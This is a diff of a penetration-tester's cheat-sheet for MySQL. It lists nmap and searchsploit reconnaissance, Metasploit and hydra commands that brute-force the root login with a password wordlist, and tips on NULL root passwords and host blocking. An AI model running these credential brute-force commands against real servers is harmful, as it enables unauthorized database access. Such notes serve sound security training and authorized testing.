@@ -1,37 +1,46 @@
 # MySQL
 
+- Basic nmap scan.
 ```
 nmap -Pn -sV -sC -p3306 <ip>
 ```
+
+- Check for existing exploits.
 ```
 searchsploit MySQL <version>
 ```
+
+- Check MySQL version.
 ```
 use auxiliary/scanner/mysql/mysql_version
 ```
 
+- Brute-force MySQL login using MSF.
+  - Focus on root as other accounts may not have sufficient privileges for our intent.
+  - root password can be NULL.
 ```
 use auxiliary/scanner/mysql/mysql_login
 set USERNAME root
 set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
 set VERBOSE false
 ```
-- Focus on `root` - most important account.
 
+- Brute-force MySQL login using hydra.
 ```
 hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt <ip> mysql
 ```
-- 
 
+- Brute-forcing can result in host being blocked.
+  - Need pre-existing shell access to target and a MySQL account to run `mysqladmin flush-hosts`.
+  - In general, avoid brute-forcing MySQL. Can test for NULL credentials manually.
 ```
 [ERROR] Host '<hostname>' is blocked because of many connection errors; unblock with 'mysqladmin flush-hosts'
 ```
 
-## Post-Exploitation
+- Connect to MySQL.
+  - Press Enter for password if NULL.
 ```
 mysql -u root -p -h <ip>
-
-# Press Enter if NULL password.
 ```
 
 ```
